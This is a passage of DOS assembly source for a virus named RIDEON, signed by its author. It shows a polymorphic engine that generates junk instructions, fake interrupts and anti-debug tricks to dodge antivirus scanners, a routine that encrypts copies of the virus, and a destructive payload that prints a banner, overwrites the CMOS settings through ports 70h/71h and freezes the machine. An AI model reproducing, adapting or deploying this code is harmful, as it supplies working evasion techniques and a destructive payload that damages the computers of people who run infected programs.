gen_subFFFE:
            cmp   byte ptr cs:[index],3h
	    je    Gen_SUBFFFE_BX
            cmp   byte ptr cs:[index],2h
	    je    Gen_SUBFFFE_SI

gen_subFFFE_DI:
	    mov   word ptr es:[DI],0EF83h             ;SUB SI,-2
	    inc   di
	    inc   di
	    mov   byte ptr es:[DI],0FEh
	    inc   di
	    ret

gen_subFFFE_SI:
	    mov   word ptr es:[DI],0EE83h             ;SUB DI,-2
	    inc   di
	    inc   di
	    mov   byte ptr es:[DI],0FEh
	    inc   di
	    ret

gen_subFFFE_BX:
	    mov   word ptr es:[DI],0EB83h             ;SUB BX,-2
	    inc   di
	    inc   di
	    mov   byte ptr es:[DI],0FEh
	    inc   di
	    ret


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                       TRASH GENERATOR                                    ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

make_trash:
            push  si
            mov   ax,2h                               ;how many trash ?
            call  Gen_Rnd_Range                       ;between 1-3
            inc   ax
            mov   cx,ax

loop_make:
            push  cx
            mov   ax,(offset end_trash - offset trash_generator)/02h
            call  gen_rnd_range
            add   ax,ax
            mov   si,offset trash_generator
            add   si,ax
            call  word ptr cs:[si]
            pop   cx
            loop  loop_make
            pop    si
            ret

gen_one_byte:
	    mov   ax,End_one_byte-table_one_byte
	    call  gen_rnd_range
            cmp   byte ptr cs:[sw_trash1],1h          ;we cant put INC or
            jnz   Gen_One_OK                          ;DEC before JNZ  :(
	    cmp   ax,6
            jae   Gen_One_Byte
gen_one_ok:   
	    mov   si,offset Table_one_byte            ;SI points to the
	    add   si,ax                               ;instruction
	    movsb
            loop  Gen_One_Byte
	    ret

gen_two_bytes:
	    mov   ax,End_two_bytes-Table_two_bytes
	    call  gen_rnd_par_range
	    mov   si,offset Table_two_bytes           ;SI points to the
	    add   si,ax                               ;instruction
	    movsw
            loop  Gen_Two_Bytes
	    ret

gen_three_bytes:
	    in    ax,40h
	    mov   si,ax
            inc   si                                  ;we don't want a 0ffffh
            jz    gen_three_bytes
	    dec   si
	    
	    mov   cl,al

            mov   ax,3                                ;get a random value
            call  gen_rnd_range                       ;between 0-3

	    or    ax,ax
            jz    gen_ax_trash                        ;make ADD/SUB/MOV
	    cmp   ax,1h
            jz    gen_dx_trash                        ;make ADD/SUB/MOV
	    cmp   ax,2h
            jnz   gen_ax_trash
            jmp   gen_bp_trash                        ;make ADD/SUB/MOV


gen_ax_trash:
            call  gen_rnd
	    and   al,1h
	    jz    add_sub_Ax

mov_ax:        
            call  gen_rnd
	    and   al,1
	    jz    mov_ax_inm
	    
mov_ax_mem:
	    mov   byte ptr es:[di],0a1h               ;MOV AX,MEM
	    inc   di
	    mov   word ptr es:[di],si
	    inc   di
	    inc   di
	    ret
mov_ax_inm:    
	    mov   byte ptr es:[di],0B8h               ;MOV AX,INM 
	    inc   di
	    mov   word ptr es:[di],si
	    inc   di
	    inc   di
	    ret

add_sub_ax: 
            call  gen_rnd
	    and   al,1
	    jz    sub_ax      
add_ax:            
	    mov   byte ptr es:[di],05h                ;ADD AX,REG 
	    inc   di
	    mov   word ptr es:[di],si
	    inc   di
	    inc   di
	    ret
sub_ax:            
	    mov   byte ptr es:[di],2Dh                ;SUB AX,REG 
	    inc   di
	    mov   word ptr es:[di],si
	    inc   di
	    inc   di
	    ret

gen_dx_trash:
            call  gen_rnd
	    and   al,1h
	    jz    add_sub_DX

mov_dx:
            call  gen_rnd
	    and   al,1
	    jz    mov_dx_inm 

mov_dx_mem: 
	    mov   word ptr es:[di],168Bh              ;MOV DX,MEM 
	    inc   di
	    inc   di
	    mov   word ptr es:[di],si
	    inc   di
	    inc   di
	    ret

mov_dx_inm:    
	    mov   byte ptr es:[di],0bah               ;MOV DX,INM
	    inc   di
	    mov   word ptr es:[di],si
	    inc   di
	    inc   di
	    ret

add_sub_dx: 
            call  gen_rnd
	    and   al,1
	    jz    sub_DX      
add_dx:            
	    mov   word ptr es:[di],0E281h             ;ADD DX,REG 
	    inc   di
	    inc   di
	    mov   byte ptr es:[di],cl
	    inc   di
	    inc   di
	    ret
sub_dx:            
	    mov   word ptr es:[di],0EA81h             ;SUB DX,inm 
	    inc   di
	    inc   di
	    mov   byte ptr es:[di],cl
	    inc   di
	    inc   di
	    ret

gen_bp_trash:
            call  gen_rnd
	    and   al,1h
	    jz    add_sub_BP

mov_bp:        
            call  gen_rnd
	    and   al,1
	    jz    mov_bp_inm
	    
mov_bp_mem:
	    mov   word ptr es:[di],2E8Bh              ;MOV BP,MEM 
	    inc   di
	    inc   di
	    mov   word ptr es:[di],si
	    inc   di
	    inc   di
	    ret
mov_bp_inm:    
	    mov   byte ptr es:[di],0BDh               ;MOV BP,VALUE
	    inc   di
	    mov   word ptr es:[di],si
	    inc   di
	    inc   di
	    ret

add_sub_bp: 
            call  gen_rnd
	    and   al,1
	    jz    sub_BP      
add_bp:            
	    mov   word ptr es:[di],0C581h             ;ADD BP,reg
	    inc   di
	    inc   di
	    mov   byte ptr es:[di],cl
	    inc   di
	    inc   di
	    ret
sub_bp:            
	    mov   word ptr es:[di],0ED81h             ;SUB BP,REG 
	    inc   di
	    inc   di
	    mov   byte ptr es:[di],cl
	    inc   di
	    inc   di
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                       PUSH/POP TRASH ROUTINES                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_push_pop:
            call  gen_one_push
            call  gen_one_pop
            ret

gen_one_push:
            mov   ax,offset end_push - offset push_table
            call  Gen_rnd_range
            mov   si,offset push_table
            add   si,ax
            movsb
            ret

gen_one_pop:
            mov   ax,offset end_pop - offset pop_table
            call  Gen_rnd_range
            mov   si,offset pop_table
            add   si,ax
            movsb
            ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                       ZER0 JUMP ROUTINE                                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_zj:
            cmp   byte ptr cs:[sw_loop],1h
            jz    gen_jz_ret
            call  gen_rnd
            and   al,0Fh                      
            add   al,70h                      
            stosb                               
            xor   ax,ax                       
            stosb                                     ;make a zero-jump 
gen_jz_ret:
            ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                       INT 21H GARBAGE FUNCTIONS                          ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_int21h: 
            cmp   byte ptr cs:[sw_loop],1h
            jz    gen_jz_ret
	    mov   ax,2h
	    call  Gen_Rnd_Range
            or    ax,ax
	    jz    Gen_Int21h_AX                       

gen_int21h_AH:
            mov   ax,End_Int21h_AH-Table_Int21h_AH    ;gen Int21h AH 
	    call  Gen_Rnd_Range
	    mov   si,offset Table_Int21h_AH
	    add   si,ax
	    
	    mov   ah,byte ptr cs:[SI]
	    cmp   byte ptr cs:[Last_Int21h],ah
	    jz    Gen_Int21h_ah
	    
            mov   byte ptr cs:[Last_Int21h],ah        ;do not repite ;)
	    
            mov   al,0B4h                             ;mov AH,Function
	    stosw
            mov   ax,021CDh                           ;int 21h
	    stosw
	    ret

gen_int21h_AX:
	    mov   ax,End_Int21h_AX-Table_Int21h_AX    
	    call  Gen_rnd_par_range
	    mov   si,offset Table_Int21h_AX
	    add   si,ax
	    
	    mov   ax,word ptr cs:[SI]
	    cmp   word ptr cs:[Last_Int21h],ax
	    jz    Gen_Int21h_AX
	    
	    mov   word ptr cs:[Last_Int21h],ax

            mov   byte ptr es:[di],0B8h               ;MOV AX,Function
	    inc   di
	    stosw
            mov   ax,021CDh                           ;gen int21h
	    stosw
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                     DO NOTHING INTS GENERATOR                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_fakeint:
            cmp   byte ptr cs:[sw_loop],1h
            jz    gen_jz_ret

	    mov   ax,offset End_Fake_int_Table-offset Fake_int_table
            call  gen_rnd_range
	    mov   si,offset Fake_Int_Table            ;SI points to the
	    add   si,ax                               ;instruction
	    
	    mov   ah,byte ptr cs:[SI]
	    cmp   byte ptr cs:[Last_IntXX],ah
            jz    gen_fakeint
	    
            mov   byte ptr cs:[Last_IntXX],ah         ;do not repite INTs ;)


	    mov   al,0CDh
	    stosw

fake_ret:   ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                     ANTI-EMULATION ROUTINES                              ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_anti_debug: 
            cmp   byte ptr es:[sw_antidb],1h
            jnz   Gen_Anti_OK
            ret

gen_anti_ok:
            mov   byte ptr es:[sw_antidb],1h

            mov   byte ptr es:[di],0FAh               ;CLI
	    inc   di
	    
	    call  Gen_Rnd
	    and   al,01h
	    jz    Gen_Fuck_2
	    
	    mov   word ptr es:[di],0d4f7h             ;NOT SP
	    inc   di
	    inc   di
	    mov   word ptr es:[di],0d4f7h             ;NOT SP         
	    inc   di
	    inc   di
	    jmp   gen_Fuck_12

gen_fuck_2:
	    mov   word ptr es:[di],0dcf7h             ;NEG SP         
	    inc   di
	    inc   di
	    mov   word ptr es:[di],0dcf7h             ;NEG SP
	    inc   di
	    inc   di

gen_fuck_12:            
            mov   byte ptr es:[di],0FBh               ;STI
	    inc   di
            ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                     RANDOMIZE NUMBER GENERATOR                           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

gen_rnd:  
            in    ax,40h                              ;number between 0 and
            in    al,40h                              ;65535h
            ret                                                         

gen_rnd_range:
            xchg  bx,ax                               ;number between 0 and
            call  Gen_rnd                             ;AX - 1
	    xor   dx,dx
	    div   bx
	    xchg  ax,dx
	    ret

gen_rnd_par_range:
	    xchg  bx,ax
	    call  Gen_Rnd
	    xor   dx,dx
	    div   bx
	    mov   ax,dx
	    push  ax
	    mov   bx,2h
	    xor   dx,dx
	    div   bx
	    cmp   dx,0h
	    pop   ax
	    jne   Gen_Rnd_Par_Range
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                       POLYMORPHIC TABLES                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

trash_generator equ this byte
            dw offset gen_one_byte                    ;one byte trash
            dw offset gen_two_bytes                   ;two byte trash
            dw offset gen_three_bytes                 ;three byte trash
            dw offset gen_push_pop                    ;push+pop  trash
            dw offset gen_zj                          ;zero jump trash
            dw offset gen_int21h                      ;fake int21h trash
            dw offset gen_three_bytes                 ;three byte trash (2)
            dw offset gen_fakeint                     ;fake intxx  trash
            dw offset gen_anti_debug                  ;anti-debug code  
end_trash   equ this byte

push_table      equ this byte                         ;push generator
            push ax
            push bx
            push cx
            push dx
            push si
            push di
            push bp
            push sp
            push cs
            push ds
            push es
            push ss
end_push        equ this byte

pop_table   equ this byte                             ;pop generator
	    pop ax
	    pop dx
	    pop bp
end_pop     equ this byte

table_int21h_AH equ this byte                   
            db 00Bh                                   ;read entry state
            db 019h                                   ;get current drive
            db 04Dh                                   ;get error code
end_int21h_AH equ this byte

table_int21h_AX equ this byte
            dw 3300h                                  ;get break-flag
            dw 3700h                                  ;get line-command sep.
            dw 5800h                                  ;get mem concept
            dw 5802h                                  ;get umb insert
end_int21h_AX equ this byte

fake_int_table equ this byte                          ;fake ints generator
	    db 01h
	    db 1Ch
	    db 08h
	    db 0Ah
	    db 0Bh
	    db 0Ch
	    db 0Dh
	    db 0Eh
	    db 0Fh
	    db 28h
	    db 2Bh
	    db 2Ch
	    db 2Dh
	    db 70h
	    db 71h
	    db 72h
	    db 73h
	    db 74h
	    db 76h
	    db 77h
end_fake_int_table equ this byte

table_one_byte equ this byte                          ;one byte table
	    aaa
	    aas
            cbw
	    clc
	    cli
	    cmc
            cwd
	    daa
	    das
            lahf
	    nop
            sahf
	    stc
	    sti
	    inc  ax
	    dec  ax
	    inc  dx
	    dec  dx
	    inc  bp
	    dec  bp
end_one_byte equ this byte

table_two_bytes equ this byte
	    pushf
	    popf
	    push ax
	    pop  ax
	    push bx
	    pop  bx
	    push cx
	    pop  cx
	    push dx
	    pop  dx
	    push ds
	    pop  ds
	    push ds
	    pop  ax
	    push ds
	    pop  dx
	    push es                        
	    pop  es                         
	    push es
	    pop  ax
	    push es
	    pop  dx
	    push ax
	    pop  dx
	    push ax
	    pop  bp
	    push dx
	    pop  ax
	    push dx
	    pop  bp
	    push bp
	    pop  ax
	    push bp
	    pop  dx
	    inc  ax                          
	    dec  ax                          
	    inc  bx                          
	    dec  bx                          
	    inc  cx                          
	    dec  cx                          
	    inc  dx                          
	    dec  dx                          
	    inc  si
	    dec  si
	    inc  di
	    dec  di
	    inc  bp
	    dec  bp
	    inc  ax
	    dec  dx
	    inc  ax
	    dec  bp
	    inc  dx
	    dec  ax
	    inc  bp
	    dec  dx
	    inc  al
	    dec  dl
	    inc  dl
	    dec  al
	    inc  dh
	    dec  ah
	    or   ax,ax                        
	    or   bx,bx                        
	    or   cx,cx                        
	    or   dx,dx                        
	    or   si,si                        
	    or   di,di                        
	    or   bp,bp                        
	    or   ah,ah                        
	    or   al,al                        
	    or   bh,bh                        
	    or   bl,bl                        
	    or   ch,ch                        
	    or   cl,cl                        
	    or   dh,dh                        
	    or   dl,dl                        
	    or   ax,dx
	    or   al,dl
	    or   ah,dh
	    or   ax,bp
	    or   bp,ax
	    or   dx,ax
	    or   dl,al
	    or   dh,ah
	    or   dx,bp
	    or   bp,ax
	    or   bp,dx
	    not  al
	    not  ah
	    not  ax
	    not  dl
	    not  dh
	    not  dx
	    not  bp
	    xor  ax,ax
	    xor  dx,dx
	    xor  bp,bp
	    xor  ax,dx
	    xor  ax,bp
	    xor  dx,ax
	    xor  dx,bp
	    xor  bp,ax
	    xor  bp,dx
	    xor  al,al
	    xor  dl,dl
	    xor  al,dl
	    xor  dl,al
	    xor  ah,ah
	    xor  dh,dh
	    xor  ah,dh
	    xor  dh,ah
	    and  ax,ax                       
	    and  bx,bx                       
	    and  cx,cx                       
	    and  dx,dx                       
	    and  si,si                       
	    and  di,di                      
	    and  bp,bp                       
	    and  ah,ah                       
	    and  al,al                       
	    and  bh,bh                       
	    and  bl,bl                       
	    and  ch,ch                       
	    and  cl,cl                       
	    and  dh,dh                       
	    and  dl,dl                       
	    and  ax,dx
	    and  ax,bp
	    and  bp,dx
	    and  bp,ax
	    and  dx,bp
	    and  dx,ax
	    and  al,dl
	    and  dl,al
	    mov  ax,dx
	    mov  ax,bp
	    mov  dx,ax
	    mov  dx,bp
	    mov  bp,ax
	    mov  bp,ax
	    mov  al,dl
	    mov  dl,al
	    mov  ah,dh
	    mov  dh,ah
	    xchg ax,dx
	    xchg ax,bp
	    xchg dx,ax
	    xchg dx,bp
	    xchg bp,ax
	    xchg bp,dx
	    xchg al,dl
	    xchg dl,al
	    xchg ah,dh
	    xchg dh,ah
end_two_bytes equ this byte


;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                      CHOOSE MATH INSTRUCTION                             ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

choose_math:
            mov  ax,3h
            call gen_rnd_range

math_xor:
            or   ax,ax
            jnz  math_add
            mov  byte ptr cs:[type_enc],0h            ;encrypt with XOR
            ret

math_add:
            cmp  ax,1
            jnz  math_sub
            mov  byte ptr cs:[type_enc],1h            ;encrypt with ADD
            ret

math_sub:
            mov  byte ptr cs:[type_enc],2h            ;encrypt with SUB
            ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                        ENCRYPTION ROUTINE                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

encryption:
            xor   si,si                               ;copy virus
            mov   di,offset Buffer                    ;to our buffer
            mov   cx,Size_SB/2+1                      ;virus size
	    repe  movsw

            mov   si,(offset Buffer+(Crypt_Start-RIDEON_Start))  
	    mov   di,si                                                 
            mov   cx,Crypt_size/2+1                   ;virus size
            mov   dx,word ptr cs:[clave]              ;key

            cmp   byte ptr cs:[type_enc],0
            jz    Encrypt_XOR
            cmp   byte ptr cs:[type_enc],1
            jz    Encrypt_ADD
            cmp   byte ptr cs:[type_enc],2
            jz    Encrypt_SUB

encrypt_XOR:         
            xor   word ptr [di],dx                    ;encrypts the copy
            movsw                                     ;XOR/XOR
            loop  Encrypt_XOR
            ret

encrypt_ADD:         
            add   word ptr [di],dx                    ;encrypts the copy
            movsw                                     ;ADD/SUB
            loop  Encrypt_ADD
            ret
   
encrypt_SUB:        
            sub   word ptr [di],dx                    ;encrypts the copy
            movsw                                     ;SUB/ADD
            loop  Encrypt_SUB
	    ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                     !! ACTIVATION ROUTINE !!                             ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

payload:       
            call  push_all

	    push  cs 
	    pop   es                                  ;CS=ES
	       
	    mov   si,bp
            mov   ax,0002                             ;clear Screen        
	    int   10h                    
	      
            mov   ah,13h                              ;move Cursor              
	    mov   al,0
	    mov   bh,0
	    mov   bl,0fh
            mov   cx,44
            mov   dh,6 
            mov   dl,15
            lea   bp,[si+offset MENSAJE]              ;messagge  
            int   10h                                 ;print messagge               
	    
            mov   cx,46
            mov   dh,9
            mov   dl,14 
            lea   bp,[si+offset MENSAJE2]             
            int   10h                                                

	    inc   dh
            lea   bp,[si+offset MENSAJE3]               
            int   10h                                                
	       
	    inc   dh
            lea   bp,[si+offset MENSAJE4]               
            int   10h                                                

	    inc   dh
            lea   bp,[si+offset MENSAJE5]               
            int   10h                                                
                       
	    inc   dh
            lea   bp,[si+offset MENSAJE6]               
            int   10h                                                
	    
	    inc   dh
            lea   bp,[si+offset MENSAJE7]               
            int   10h                                                

            call  pop_all

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                            DESTROY CMOS                                  ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

kill_cmos: 
	    mov   bp,7C00h
            mov   cx,29Ah                             ;hi, guys !

kill_cmos2:    
	    mov   al,cl       
	    out   70h,al                              ;CMOS !!
	    xor   al,al
            out   71h,al                              ;overwrite CMOS !!         
	    loop  kill_cmos2
            jmp   $                                   ;like micro$oft :P


MENSAJE    DB 'ÄÄ  [RIDEON] (c) ThE_WiZArD / DDT (Spain)  ÄÄ' 

MENSAJE2    DB 'ÛÛÛÛÛÛ  ÛÛ ÛÛÛÛÛ  ÛÛÛÛÛ     ÛÛÛÛÛÛÛ ÛÛÛ     ÛÛ'
MENSAJE3    DB 'Û    Û  ÛÛ ÛÛ  ÛÛ ÛÛ        ÛÛ   ÛÛ ÛÛÛÛ    ÛÛ'
MENSAJE4    DB 'ÛÛÛÛÛÛ  ÛÛ ÛÛ  ÛÛ ÛÛ        ÛÛ   ÛÛ ÛÛ ÛÛ   ÛÛ'
MENSAJE5    DB 'ÛÛ ÛÛ   ÛÛ ÛÛ  ÛÛ ÛÛÛÛÛ     ÛÛ   ÛÛ ÛÛ  ÛÛ  ÛÛ'
MENSAJE6    DB 'ÛÛ  ÛÛ  ÛÛ ÛÛ  ÛÛ ÛÛ        ÛÛ   ÛÛ ÛÛ   ÛÛ ÛÛ'
MENSAJE7    DB 'ÛÛ   ÛÛ ÛÛ ÛÛÛÛÛ  ÛÛÛÛÛ     ÛÛÛÛÛÛÛ ÛÛ    ÛÛÛÛ'


Crypt_End label byte

vshit        db   0
clave        dw   0
today        db   0
old_date     dw   0
old_time     dw   0
org_time     dw   0                                   ;orig. time
header       db   0CDh,020h,90h,01h                   ;original 4 bytes

Size_Sin_Buffer:

; data for polymorphic engine (not inserted into infections)

last_intxx     db 0                                  
last_int21h    db 0                                 
index          db 0                               
sw_trash2      db 0                                 
sw_antidb      db 0                                
sw_loop        db 0                                 
sw_trash1      db 0
cx_first       db 0
address_loop   dw 0                                     
delta_ofs      dw 0
type_enc       db 0

buffer       db (offset buffer-offset rideon_start) dup (0)


RIDEON_end  label   byte
RIDEON      ends
            end     RIDEON_start

